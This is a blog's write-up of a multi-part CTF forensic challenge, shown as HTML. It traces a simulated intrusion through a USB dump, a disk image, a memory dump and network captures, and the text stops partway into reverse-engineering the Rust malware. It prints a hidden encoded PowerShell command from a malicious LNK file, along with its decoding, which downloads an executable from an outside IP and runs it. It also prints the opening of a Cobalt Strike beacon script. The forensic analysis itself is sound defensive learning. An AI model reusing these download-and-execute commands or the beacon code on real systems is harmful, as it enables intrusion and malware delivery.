@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <script defer data-domain="itarow.xyz" src="https://plausible.itarow.xyz/js/plausible.js"></script>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> HeroCTFv4 - Where_all_problems_starts | Itarow</title>
+  <link rel = 'canonical' href = 'https://blog.itarow.xyz/posts/heroctfv4-where_all_problems_starts/'>
+  <meta name="description" content="CS student, writing some write up of cool CTF&#39;s challenges and infosec content.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="HeroCTFv4 - Where_all_problems_starts" />
+<meta property="og:description" content="HeroCTFv4 - Forensic - Where all problems start This is the write-up of &ldquo;Where all problems start&rdquo;, a forensic challenge of the HeroCTFv4 created by Worty . It is divided in four parts with four different files.
+Part 1 - USB parition For a change of pace, a company has been attacked again... Nevertheless , the means used here is quite original, indeed, it would be apparently a food delivery man who would be at the origin of the initial compromise." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.itarow.xyz/posts/heroctfv4-where_all_problems_starts/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-05-29T22:15:27+02:00" />
+<meta property="article:modified_time" content="2022-05-29T22:15:27+02:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HeroCTFv4 - Where_all_problems_starts"/>
+<meta name="twitter:description" content="HeroCTFv4 - Forensic - Where all problems start This is the write-up of &ldquo;Where all problems start&rdquo;, a forensic challenge of the HeroCTFv4 created by Worty . It is divided in four parts with four different files.
+Part 1 - USB parition For a change of pace, a company has been attacked again... Nevertheless , the means used here is quite original, indeed, it would be apparently a food delivery man who would be at the origin of the initial compromise."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://blog.itarow.xyz/css/styles.4dd8e96d6c0d53a6965a5a357c26fc29f6b838ad352dc5acda0754ff4b9409e5c58fa94716892c2a5d6a7e1b1bef8fbcaf2442656e81dfae00dc9464d707477d.css" integrity="sha512-TdjpbWwNU6aWWlo1fCb8Kfa4OK01LcWs2gdU/0uUCeXFj6lHFoksKl1qfhsb74&#43;8ryRCZW6B364A3JRk1wdHfQ=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://blog.itarow.xyz/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://blog.itarow.xyz/posts/fcsc2022-r2d2/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://blog.itarow.xyz/posts/pwnanalyzed/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&text=HeroCTFv4%20-%20Where_all_problems_starts" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&title=HeroCTFv4%20-%20Where_all_problems_starts" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&is_video=false&description=HeroCTFv4%20-%20Where_all_problems_starts" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=HeroCTFv4%20-%20Where_all_problems_starts&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&title=HeroCTFv4%20-%20Where_all_problems_starts" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&title=HeroCTFv4%20-%20Where_all_problems_starts" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&name=HeroCTFv4%20-%20Where_all_problems_starts&description=HeroCTFv4%20-%20Forensic%20-%20Where%20all%20problems%20start%20This%20is%20the%20write-up%20of%20%26ldquo%3bWhere%20all%20problems%20start%26rdquo%3b%2c%20a%20forensic%20challenge%20of%20the%20HeroCTFv4%20created%20by%20Worty%20.%20It%20is%20divided%20in%20four%20parts%20with%20four%20different%20files.%0aPart%201%20-%20USB%20parition%20For%20a%20change%20of%20pace%2c%20a%20company%20has%20been%20attacked%20again...%20Nevertheless%20%2c%20the%20means%20used%20here%20is%20quite%20original%2c%20indeed%2c%20it%20would%20be%20apparently%20a%20food%20delivery%20man%20who%20would%20be%20at%20the%20origin%20of%20the%20initial%20compromise." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fheroctfv4-where_all_problems_starts%2f&t=HeroCTFv4%20-%20Where_all_problems_starts" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#part-1---usb-parition">Part 1 - USB parition</a></li>
+    <li><a href="#part-2---disk-parition">Part 2 - Disk parition</a></li>
+    <li><a href="#part-3---memory-dump">Part 3 - Memory Dump</a></li>
+    <li><a href="#part-4---pcap-capture">Part 4 - PCAP Capture</a>
+      <ul>
+        <li><a href="#reverse-engineering-the-rust-malware">Reverse-engineering the Rust malware</a>
+          <ul>
+            <li><a href="#cutter-and-ghidra-decompiler">Cutter (and Ghidra decompiler)</a></li>
+            <li><a href="#ida">IDA</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        HeroCTFv4 - Where_all_problems_starts
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2022-05-29 22:15:27 &#43;0200 CEST" itemprop="datePublished">2022-05-29</time>
+          
+        </div>
+        
+        
+        <div class="article-read-time">
+          <i class="far fa-clock"></i>
+          
+          14 minute read
+        </div>
+        
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/categories/heroctf">HeroCTF</a>
+            
+        </div>
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/forensic" rel="tag">Forensic</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/malware" rel="tag">Malware</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/rust" rel="tag">Rust</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/ctf" rel="tag">CTF</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <h1 id="heroctfv4---forensic---where-all-problems-start">HeroCTFv4 - Forensic - Where all problems start</h1>
+<p>This is the write-up of &ldquo;Where all problems start&rdquo;, a forensic challenge of the <a href="https://www.heroctf.fr/">HeroCTFv4</a> created by <a href="https://twitter.com/_Worty">Worty</a> . It is divided in four parts with four different files.</p>
+<h2 id="part-1---usb-parition">Part 1 - USB parition</h2>
+<pre tabindex="0"><code class="language-Difficulty" data-lang="Difficulty">
+For a change of pace, a company has been attacked again... Nevertheless
+, the means used here is quite original, indeed, it would be apparently
+a food delivery man who would be at the origin of the initial 
+compromise... For your first analysis, you will have to found what
+the USB key that the delivery man put in the computer contains.
+
+Could you provide us the malicious URL used to download something ?
+</code></pre><p>In this part, we have a disk dump of the USB key, so let&rsquo;s analyze it.</p>
+<pre tabindex="0"><code class="language-➜" data-lang="➜">usb.dump: DOS/MBR boot sector, code offset 0x58+2, OEM-ID &#34;mkfs.fat&#34;, sectors/cluster 8, Media descriptor 0xf8, sectors/track 62, heads 124, hidden sectors 32, sectors 7831282 (volumes &gt; 32 MB), FAT (32 bit), sectors/FAT 7640, reserved 0x1, serial number 0x9c286c52, unlabeled
+</code></pre><p>First, we could try to mount it : <code>sudo mount usb.dump /mnt</code></p>
+<p><img src="/img/waps/0.png" alt=""></p>
+<p>Nothing interesting, let&rsquo;s look with <code>testdisk</code> if we could see something (removed file ?).</p>
+<p>We see that it&rsquo;s a FAT32 partition :</p>
+<p><img src="/img/waps/1.png" alt=""></p>
+<p>We could list the files of the partition with Boot and List menu :</p>
+<p><img src="/img/waps/2.png" alt=""></p>
+<p>We see here that there is a document which was removed : &ldquo;Important_Document.lnk&rdquo;. We dump it.</p>
+<pre tabindex="0"><code>➜  part1 file Important_Document.lnk
+Important_Document.lnk: MS Windows shortcut
+</code></pre><p>This is a LNK file, just a symbolic link on Windows, it&rsquo;s very used to hide backdoors.</p>
+<p>We just <code>cat</code> it and we extract this data :</p>
+<pre tabindex="0"><code>powershell.exe -Nop -sta -noni -w hidden -encodedCommand YwBkACAAQwA6AFwAVQBzAGUAcgBzAFwAVwBvAHIAdAB5AFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXAAgADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwADoALwAvADEANAA2AC4ANQA5AC4AMQA1ADYALgA4ADIALwBpAG0AZwAuAHAAbgBnACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAGkAZQB4AHAAbABvAHIAZQByADYANAAuAGUAeABlACIAIAA7ACAALgBcAGkAZQB4AHAAbABvAHIAZQByADYANAAuAGUAeABlAA==
+</code></pre><p>This is a malicious powershell command with a base64 argument. The thing to note here is base64 needs to be in UTF-16, so we use an online decoder to decode it : <a href="https://the-x.cn/en-US/base64">https://the-x.cn/en-US/base64</a></p>
+<pre tabindex="0"><code>cd C:\Users\Worty\AppData\Local\Temp\ ; Invoke-WebRequest -Uri &#34;http://146.59.156.82/img.png&#34; -OutFile &#34;iexplorer64.exe&#34; ; .\iexplorer64.exe
+</code></pre><p>These are the commands executed, there is a web request on 146.59.156.82 where the file img.png is dropped as iexplorer64.exe and launched after.</p>
+<p>So we have our flag, the malicious url : <code>Hero{http://146.59.156.82/img.png}</code></p>
+<h2 id="part-2---disk-parition">Part 2 - Disk parition</h2>
+<pre tabindex="0"><code>Difficulty : very-hard
+
+Well, the USB key was pretty obvious! You are now provided with a dump
+of the file system of the infected machine. Can you identify the
+actions of the malware that was loaded from the usb drive?
+</code></pre><p>For these part, we have the windows image disk of the victim. We need to find a flag, or parts of flag somewhere, linked to what we found if the first part.</p>
+<p>Firstly, I mounted the disk with extracting the partition with <code>testdisk</code> because EFI and MS partitions prevents me to mount the file system. (It&rsquo;s a windows partition)</p>
+<p>Next, I search for the malware of the part 1 (iexplorer64.exe) :</p>
+<pre tabindex="0"><code class="language-➜" data-lang="➜">Windows/System32/iexplorer64.exe
+Windows/Prefetch/IEXPLORER64.EXE-E115DED1.pf
+</code></pre><p>We find it, and we start the analysis of it.</p>
+<p>At the moment, I launched Ghidra and start to strings it and I found Rust patterns .. I just closed Ghidra quickly x)</p>
+<p><img src="/img/waps/3.png" alt=""></p>
+<p>So let&rsquo;s analyze the strings :</p>
+<p><img src="/img/waps/4.png" alt=""></p>
+<p>Many encoded patterns, we could try to decode them if we could find some information :</p>
+<p>I like using this website : <a href="https://www.dcode.fr/cipher-identifier">https://www.dcode.fr/cipher-identifier</a> , pretty cool to recognize baseXX patterns.</p>
+<p><code>41AMoD4RLwE7h2REtSWSGfUFu=</code> is base58 -&gt; <code>Hero{p3rs0n4l_3v1l</code></p>
+<p>We find a part of the flag.</p>
+<p>There is also this string :</p>
+<pre tabindex="0"><code class="language-schtasks" data-lang="schtasks"></code></pre><p>Referring to the documentation : <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks</a></p>
+<p>This powershell command is used to create a planning task and run the <code>bc.ps1</code> file the 22/05/2022 and also launched an echo command.</p>
+<p>The argument is <code>4xZkKhuR78J21Hwfsp3tmEDcS</code> which is base58 also : <code>_m4lw4r3_n0t_fl4g_</code> .</p>
+<p>We now have two parts of the flag. We could focus the planned task.</p>
+<p>The name of the task is <code>apocalypse</code> and the file launched is located in <code>\\wsl$\Ubuntu\tmp\</code> which is a WSL folder. WSL for Windows Subsystem for Linux allows Windows users to run Linux on Windows. Our goal if to find the content of bc.ps1.</p>
+<p>Windows tasks are in the <code>Windows/System32/Tasks/</code> folder and are included by XML files. For <code>apocalipse</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;Actions</span> <span style="color:#a6e22e">Context=</span><span style="color:#e6db74">&#34;Author&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;Exec&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Command&gt;</span>\\\\wsl$\\Ubuntu\\tmp\\bc.ps1<span style="color:#f92672">&lt;/Command&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Arguments&gt;</span>-c 4xZkKhuR78J21Hwfsp3tmEDcS<span style="color:#f92672">&lt;/Arguments&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/Exec&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/Actions&gt;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>We see more precisely the flag that we found, it is an argument of the bc.ps1 file.</p>
+<p>Now we need google to find, where WSL system is located on the files ystem. We find this PATH (<a href="https://askubuntu.com/questions/759880/where-is-the-ubuntu-file-system-root-directory-in-windows-subsystem-for-linux-an)">https://askubuntu.com/questions/759880/where-is-the-ubuntu-file-system-root-directory-in-windows-subsystem-for-linux-an)</a>:</p>
+<pre tabindex="0"><code class="language-➜" data-lang="➜">➜  LocalState ls
+ext4.vhdx
+➜  LocalState file ext4.vhdx
+ext4.vhdx: Microsoft Disk Image eXtended
+```We have the ext4 partition (vhdx) which is the Ubuntu WSL partition. Now we need to find how to mount it.
+
+This github gist is really cool for that : https://gist.github.com/allenyllee/0a4c02952bf695470860b27369bbb60d
+
+We reuse the script and change the mount command by `sudo mount -o rw,nouser /dev/nbd0 mnt` because there isn&#39;t subvolumes in our case, we just have the ext4 partition.
+
+```➜  part2 sh mount_vhdx.sh ext4.vhdx mnt
+rmmod: ERROR: Module nbd is not currently loaded
+➜  part2 head mnt/tmp/bc.ps1
+Set-StrictMode -Version 2
+
+#YnlfZDNmM25kM3J9
+
+$DoIt = @&#39;
+function func_get_proc_address {
+        Param ($var_module, $var_procedure)
+        $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&#39;\\&#39;)[-1].Equals(&#39;System.dll&#39;) }).GetType(&#39;Microsoft.Win32.UnsafeNativeMethods&#39;)
+        $var_gpa = $var_unsafe_native_methods.GetMethod(&#39;GetProcAddress&#39;, [Type[]] @(&#39;System.Runtime.InteropServices.HandleRef&#39;, &#39;string&#39;))
+        return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#39;GetModuleHandle&#39;)).Invoke($null, @($var_module)))), $var_procedure))
+</code></pre><p>We have the content of bc.ps1 ! Perfect, we read it and at the top we find a comment in base64 -&gt;  <code>YnlfZDNmM25kM3J9</code> -&gt; <code>by_d3f3nd3r}</code>.</p>
+<p>We now have the 3 parts, we concatenate them and flagz : <code>Hero{p3rs0n4l_3v1l_m4lw4r3_n0t_fl4g_by_d3f3nd3r}</code></p>
+<p>PS: The bc.ps1 was just a powershell Cobalt Strike beacon, nothing interesting with it later.</p>
+<h2 id="part-3---memory-dump">Part 3 - Memory Dump</h2>
+<pre tabindex="0"><code class="language-Difficulty" data-lang="Difficulty">
+The malware was therefore custom and specifically targeted this company
+, so there is no way to use known databases to identify its different
+keys...
+
+There is (or are) some malicious connexion(s) too...
+
+This malware seems to act like a droper for another ones, but we are 
+not really sure.. could you find some informations to confirm that ?
+
+Flag Format : Hero{ip:port-deleted_file_1-deleted_file_2-path_of_malware}
+
+Example : 
+Hero{198.56.23.41:1337-superimage.png-mymarks.txt-C:\Programmes\superevil.exe
+</code></pre><p>For this third section we have a memory dump, so we need to use volatility to find the requested information.</p>
+<p>We quickly find the volatility profile with <code>imageinfo</code> plugin : Win10x64_19041</p>
+<p>Then we could start to use <code>pstree</code> plugin to list the processes with order :</p>
+<p><img src="/img/waps/5.png" alt=""></p>
+<p>We have the powershell command which run iexplorer64, etc&hellip;</p>
+<p>But let&rsquo;s focus on information asked. We need to find two deleted files. There was this string on the malware :</p>
+<p><code>C:\Users\j.bertrand\Documents\*.*</code></p>
+<p>This makes us think of a form of wiper which is going to remove all files in this directory, this idea could be confirmed by the statement of the challenge : &ldquo;The malware was therefore custom and specifically targeted this company&rdquo;.</p>
+<p>We use strings and strings -el on the memory dump. Don&rsquo;t forget to use <code>-el</code> to read UTF-16 strings.</p>
+<p>Now grep part :) :</p>
+<pre tabindex="0"><code class="language-➜" data-lang="➜">...
+{&#34;displayText&#34;:&#34;todo.txt&#34;,&#34;activationUri&#34;:&#34;ms-shellactivity:&#34;,&#34;appDisplayName&#34;:&#34;Bloc-notes&#34;,&#34;description&#34;:&#34;C:\\Users\\j.bertrand\\Documents\\todo.txt&#34;,&#34;backgroundColor&#34;:&#34;b
+lack&#34;,&#34;contentUri&#34;:&#34;file:///C:/Users/j.bertrand/Documents/todo.txt?VolumeId={3DF0DA5B-0A80-4E0A-BDAE-E9932FC1110A}&amp;ObjectId={4C53AD6C-DDD4-11EC-9F30-000C2939E9D1}&amp;KnownFol
+derId=Local Documents&amp;KnownFolderLength=29&#34;}
+...
+{&#34;displayText&#34;:&#34;background.bmp&#34;,&#34;activationUri&#34;:&#34;ms-shellactivity:&#34;,&#34;appDisplayName&#34;:&#34;Paint&#34;,&#34;description&#34;:&#34;C:\\Users\\j.bertrand\\Documents\\background.bmp&#34;,&#34;backgroundCo
+lor&#34;:&#34;black&#34;,&#34;contentUri&#34;:&#34;file:///C:/Users/j.bertrand/Documents/background.bmp?VolumeId={3DF0DA5B-0A80-4E0A-BDAE-E9932FC1110A}&amp;ObjectId={4C53AD7A-DDD4-11EC-9F30-000C2939E
+9D1}&amp;KnownFolderId=Local Documents&amp;KnownFolderLength=29&#34;}
+...
+</code></pre><p>We find two files right here :</p>
+<ul>
+<li><code>C:/Users/j.bertrand/Documents/todo.txt</code> open by notepad.exe</li>
+<li><code>C:/Users/j.bertrand/Documents/background.bmp</code> open by mspaint.exe</li>
+</ul>
+<p>Both of these files can&rsquo;t be found with the filescan volatility plugin. So we found the two files.</p>
+<p>Now we need to find an IP and a Port which refers to a strange connection.</p>
+<p>I had a hard time on this part because I didn&rsquo;t find any strange connection IP except the IP we found on part one.</p>
+<p>The problem here was with volatility2. The plugin <code>netscan</code> didn&rsquo;t show me the malicious connection.</p>
+<p>After some time, I decided to try the network connection plugin of volatility3, and we found something interesting.</p>
+<pre tabindex="0"><code>python3 volatility3/vol.py -f ./memory.dmp windows.netscan.NetScan
+
+...
+0xd88f5e3d3050	TCPv4	172.16.128.129	59533	161.97.163.247	80	CLOSE_WAIT	4316	powershell.exe	2022-05-27 15:58:27.000000 
+...
+</code></pre><p>8 minutes after the malware was run, there is this connection on the ip 161.97.163.247 and port 80, for sure http connection from a powershell process. I google the IP to see if it&rsquo;s not a microsoft one&rsquo;s, and it&rsquo;s a Contabo IP (VPS provider), smells good for us.</p>
+<p>To confirm this, let&rsquo;s grep <code>http://161.97.163.247</code>.</p>
+<pre tabindex="0"><code class="language-➜" data-lang="➜">http://161.97.163.247/
+http://161.97.163.247/dot.gif
+http://161.97.163.247/dot.gif
+http://161.97.163.247/VfZF
+http://161.97.163.247/VfZF
+http://161.97.163.247/VfZF
+http://161.97.163.247/VfZF
+http://161.97.163.247/dot.gif
+</code></pre><p>Now we are sure that&rsquo;s the right way, the http server is actually down, we have the ip and the port : ip 161.97.163.247 &amp; port 80</p>
+<p>We could also see that powershell was launched in the last commands with the <code>cmdline</code> plugin of volatility. Http connections and it corresponds to what we see in netscan plugin temporality.</p>
+<p>Last goal was to find the original iexplorer64.exe PATH, I struggled a lot on this, but it was very easy, the PATH was just what we found on part 2 : <code>C:\Windows\System32\iexplorer64.exe</code>. So the answer wasn&rsquo;t this path : <code>C:\Users\j.bertrand\AppData\Local\Temp\iexplorer64.exe</code>, where the program was launched (by the LNK file). But <code>C:\Windows\System32\</code> where the malware was duplicated on.</p>
+<p>PS : I&rsquo;ve gone too far with looking at prefetch files and EVTX but it was useless.</p>
+<p>Concatenate all of the informations and we have a flagz : <code>Hero{161.97.163.247:80-background.bmp-todo.txt-C:\Windows\System32\iexplorer64.exe}</code></p>
+<h2 id="part-4---pcap-capture">Part 4 - PCAP Capture</h2>
+<pre tabindex="0"><code class="language-Difficulty" data-lang="Difficulty">A network administrator has woken up and tells us that he makes network
+dumps very frequently. Moreover, the malware seems to have exfiltrated 
+files but we are not sure and the capture seems unreadable... it&#39;s up
+to you to find the exfiltrated files!
+</code></pre><p>Now the last part of the challenge, we have a PCAP file so let&rsquo;s analyze it with wireshark.</p>
+<p>There are many web and https connections on youtube, twitter, etc&hellip; During the challenge I was faked by the length of UDP packets (1337) x) , I thought that it was a strange UDP exfiltration but with many packets. The thing is the protocol used was HTTP3, and It used UDP. I confirmed this wrong idea with the IPv6 destination ips. I googled them and at each time, it corresponds to google or twitter, not a C2.</p>
+<p><img src="/img/waps/6.png" alt=""></p>
+<p>With many packets like this, the idea was to filter destination IP. With this, we find again the VPS IP that we found on part 3 : 161.97.163.247 .</p>
+<p>If we filter destination packets on wireshark :</p>
+<p><img src="/img/waps/7.png" alt=""></p>
+<p>We see strange TCP and IPv4 requests on 1337 port of 161.97.163.247, looks good.</p>
+<p>I extract these packets on a file for a better analysis. If we follow TCP streams :</p>
+<p><img src="/img/waps/8.png" alt="">
+<img src="/img/waps9.png" alt=""></p>
+<p>We find 3 exfiltrations of data (two of them on the images). Obviously, this data is encrypted, so our goal is to decrypt them. Packets lengths are multiples of 16 which could we related to AES.</p>
+<p>That&rsquo;s all for the forensic part, now we need to reverse the malware to find a key or something to decrypt the data.</p>
+<p>My reverse skills are very limited, so I make contribute my teammate SeulAParis(<a href="https://twitter.com/seulaparis">https://twitter.com/seulaparis</a>) to help me on the reverse part.</p>
+<p>He will explain to you of he managed to decrypt the data.</p>
+<h3 id="reverse-engineering-the-rust-malware">Reverse-engineering the Rust malware</h3>
+<p>During the CTF, I was given this malware with a bit of context as to what we already knew about it:</p>
+<ul>
+<li>It serves as a dropper for a powershell file that is a Cobalt Strike beacon.</li>
+<li>It is also a wiper.</li>
+</ul>
+<p>With this information, I was supposed to reverse-engineer it to find the last flag of the forensic series.</p>
+<p>A brief overview of the file informs us that the malware was written in Rust and that its symbols have been stripped. I cruelly lack experience in Rust reverse-engineering (I can barely even write Rust to begin with), but I figure classic tools like cutter and IDA will be enough for it to work. I also lack experience with using proper tools for reverse engineering, that is why I switch from one to the other (I mostly use Cutter for its decompiler, since I am not enough of an evil hacker to pirate IDA).</p>
+<h4 id="cutter-and-ghidra-decompiler">Cutter (and Ghidra decompiler)</h4>
+<p>With cutter I tried to retrieve the source code of the main function. After a few hours of staring into the void and trying to make sense of what I was seeing, I decided that was not the way to go. A few things I managed to gather from this analysis however were:</p>
+<ul>
+<li>Main&rsquo;s address is 0x22f0.</li>
+<li>The position of the powershell dropper code: it loads a long string of base64 into memory, opens a file in the WSL file system, decodes the base64, decrypts the result (I don&rsquo;t know how), and puts it into the file. Working with Itarow allowed me to see the content of the decrypted powershell file (whose length matched my encrypted string&rsquo;s length), that he had managed to find in the part 2.</li>
+<li>A few weird strings, the position of the function that lists all the files to wipe (because it takes <code>C:\Users\j.bertrand\Documents\*.*</code> as an argument), but I had a lot of trouble making sense of all of it.</li>
+</ul>
+<p>The role of each function was guessed by looking at the arguments that it took: a function that takes a filename as input is likely to be an open() equivalent, one that takes base64 as input is likely to be some kind of base64 decode, and so on&hellip;</p>
+<p>At this point I was losing faith in Cutter and starting to think about opening IDA. Talking with Itarow lead us to believe that before the files were wiped, they were sent on the network to a C&amp;C server, because of what he could see in a network capture: the problem was that these files were ciphered, and this made the goal of the challenge to decipher them. This also lead me to believe that we might be able to shorten the reverse engineering step of the challenge by making some educated crypto guesses.</p>
+<h4 id="ida">IDA</h4>
+<p>Before taking out the big guns, I went back to the basics to see what libs might have been used in the creation of the malware:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>&gt;<span style="color:#f92672">(</span>°~°<span style="color:#f92672">)</span>&lt; $ strings iexplorer64.exe | grep registry
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\w</span>0rty<span style="color:#ae81ff">\.</span>cargo<span style="color:#ae81ff">\r</span>egistry<span style="color:#ae81ff">\s</span>rc<span style="color:#ae81ff">\g</span>ithub.com-1ecc6299db9ec823<span style="color:#ae81ff">\b</span>ase64-0.13.0<span style="color:#ae81ff">\s</span>rc<span style="color:#ae81ff">\d</span>ecode.rs
